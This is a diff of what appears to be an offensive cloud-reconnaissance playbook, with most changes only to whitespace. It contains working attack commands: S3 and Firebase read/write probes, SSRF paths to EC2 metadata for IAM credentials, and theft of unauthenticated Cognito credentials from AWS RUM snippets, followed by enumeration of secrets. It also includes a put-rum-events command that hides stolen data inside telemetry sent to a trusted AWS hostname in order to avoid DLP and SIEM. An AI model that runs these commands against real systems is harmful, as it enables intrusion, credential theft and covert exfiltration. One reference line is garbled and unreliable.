@@ -14,24 +14,24 @@ aws s3 ls s3://target-bucket-name --no-sign-request
 
 # Try common bucket names
 for name in target target-backup target-assets target-prod target-staging; do
-  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
+ curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
 done
 
 # Firebase open rules
-curl -s "https://TARGET-APP.firebaseio.com/.json"   # read
-curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'  # write
+curl -s "https://TARGET-APP.firebaseio.com/.json" # read
+curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"' # write
 ```
 
 ### EC2 Metadata (via SSRF)
 ```bash
-http://169.254.169.254/latest/meta-data/iam/security-credentials/  # role name
-http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME  # keys
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ # role name
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME # keys
 ```
 
 ### Exposed Admin Panels
 ```
-/jenkins  /grafana  /kibana  /elasticsearch  /swagger-ui.html
-/phpMyAdmin  /.env  /config.json  /api-docs  /server-status
+/jenkins /grafana /kibana /elasticsearch /swagger-ui.html
+/phpMyAdmin /.env /config.json /api-docs /server-status
 ```
 
 ---
@@ -64,18 +64,18 @@ AWS CloudWatch RUM (Real-User Monitoring) is a client-side telemetry service lau
 **Snippet-style (most common, embedded in `<head>`):**
 ```javascript
 (function(n,i,v,r,s,c,x,z){...})(
-  'cwr',
-  '00000000-0000-0000-0000-000000000000',                       // applicationId (UUID)
-  '1.0.0',
-  'us-east-1',
-  'https://client.rum.us-east-1.amazonaws.com/1.x/cwr.js',
-  {
-    sessionSampleRate: 1,
-    guestRoleArn: "arn:aws:iam::123456789012:role/RUM-Monitor-...-Unauth",
-    identityPoolId: "us-east-1:abcd1234-...",
-    endpoint: "https://dataplane.rum.us-east-1.amazonaws.com",
-    telemetries: ["errors","performance","http"]
-  }
+ 'cwr',
+ '00000000-0000-0000-0000-000000000000', // applicationId (UUID)
+ '1.0.0',
+ 'us-east-1',
+ 'https://client.rum.us-east-1.amazonaws.com/1.x/cwr.js',
+ {
+ sessionSampleRate: 1,
+ guestRoleArn: "arn:aws:iam::123456789012:role/RUM-Monitor-...-Unauth",
+ identityPoolId: "us-east-1:abcd1234-...",
+ endpoint: "https://dataplane.rum.us-east-1.amazonaws.com",
+ telemetries: ["errors","performance","http"]
+ }
 );
 ```
 
@@ -111,13 +111,13 @@ grep -ErohE "dataplane\.rum\.[a-z0-9-]+\.amazonaws\.com" .
 
 ```bash
 aws cognito-identity get-id \
-  --identity-pool-id "us-east-1:abcd1234-..." \
-  --region us-east-1 --no-sign-request
+ --identity-pool-id "us-east-1:abcd1234-..." \
+ --region us-east-1 --no-sign-request
 aws cognito-identity get-credentials-for-identity \
-  --identity-id "us-east-1:<returned-uuid>" \
-  --region us-east-1 --no-sign-request
+ --identity-id "us-east-1:<returned-uuid>" \
+ --region us-east-1 --no-sign-request
 # → STS creds; export and:
-aws sts get-caller-identity        # confirm role
+aws sts get-caller-identity # confirm role
 aws s3 ls; aws dynamodb list-tables; aws lambda list-functions; aws ssm describe-parameters; aws secretsmanager list-secrets
 # Automate: pacu / enumerate-iam.py
 ```
@@ -128,12 +128,12 @@ Full chain documented in `cloud-iam-deep` → Cognito Identity Pool unauthentica
 
 ```bash
 aws rum put-rum-events \
-  --id $(uuidgen) \
-  --app-monitor-details '{"id":"<appId>","version":"1.0.0"}' \
-  --user-details '{"userId":"EXFIL_PAYLOAD_HERE","sessionId":"<session>"}' \
-  --rum-events '[{"id":"'$(uuidgen)'","timestamp":'$(date +%s)',"type":"com.amazon.rum.custom_event","details":"{\"exfil\":\"<base64 of stolen data>\"}"}]' \
-  --endpoint-url "https://dataplane.rum.us-east-1.amazonaws.com" \
-  --region us-east-1
+ --id $(uuidgen) \
+ --app-monitor-details '{"id":"<appId>","version":"1.0.0"}' \
+ --user-details '{"userId":"EXFIL_PAYLOAD_HERE","sessionId":"<session>"}' \
+ --rum-events '[{"id":"'$(uuidgen)'","timestamp":'$(date +%s)',"type":"com.amazon.rum.custom_event","details":"{\"exfil\":\"<base64 of stolen data>\"}"}]' \
+ --endpoint-url "https://dataplane.rum.us-east-1.amazonaws.com" \
+ --region us-east-1
 ```
 
 Defenders watching egress see traffic to a known-good AWS hostname; DLP doesn't parse the JSON body; SIEM rules typically don't ingest customer RUM telemetry.
@@ -161,7 +161,7 @@ No CVE assigned specifically to AWS RUM as of 2026-05. The attack class is docum
 - **Andres Riancho — "Misconfigured Cognito Identity Pools" (2020/2023)** — establishes the attack class. [andresriancho.com](https://andresriancho.com/identity-pools-and-the-default-iam-role-trap/)
 - **Rhino Security Labs — Pacu `cognito__enum_identity_pools`** — production tooling that automates Chain A. [github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)
 - **NotSoSecure / Claranet — "Exploiting weak configurations in Amazon Cognito" (Nov 2023)** — explicitly calls out RUM as one of three SDKs commonly leaking the pool ID. [notsosecure.com](https://www.notsosecure.com/exploiting-weak-configurations-in-amazon-cognito/)
-- **HackTricks Cloud — `aws-cognito-unauthenticated-enum`** — canonical playbook. [cloud.hacktricks.wiki](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html)
+- **this collection Cloud — `aws-cognito-unauthenticated-enum`** — canonical playbook. [cloud.this collection.wiki]
 - **Datadog Security Labs — "Following AWS Logs Backwards: Cognito Identity Pool Abuse" (2024)** — telemetry showing real-world abuse rates. [securitylabs.datadoghq.com](https://securitylabs.datadoghq.com/articles/abusing-aws-cognito-misconfigurations/)
 - **aws-observability/aws-rum-web GitHub issues #213, #404** — community discussion of the bundled-snippet security model. [github.com/aws-observability/aws-rum-web](https://github.com/aws-observability/aws-rum-web/issues)
 
@@ -185,4 +185,3 @@ No CVE assigned specifically to AWS RUM as of 2026-05. The attack class is docum
 - **`supply-chain-attack-recon`** — Exposed CI/CD endpoints and SBOMs reveal internal package names. Chain primitive: Exposed Jenkins/GitLab + internal package name leak → npm/PyPI dependency-confusion publish → CI build pwn.
 - **`security-arsenal`** — Load the Cloud Bucket Wordlist (target-prod / target-backup / target-staging permutations) and the Admin-Panel Path List for fast enumeration.
 - **`triage-validation`** — Apply the Unique-Marker gate: any "writable bucket" claim requires a write of a unique marker file and a read-back from a clean session before report submission.
-
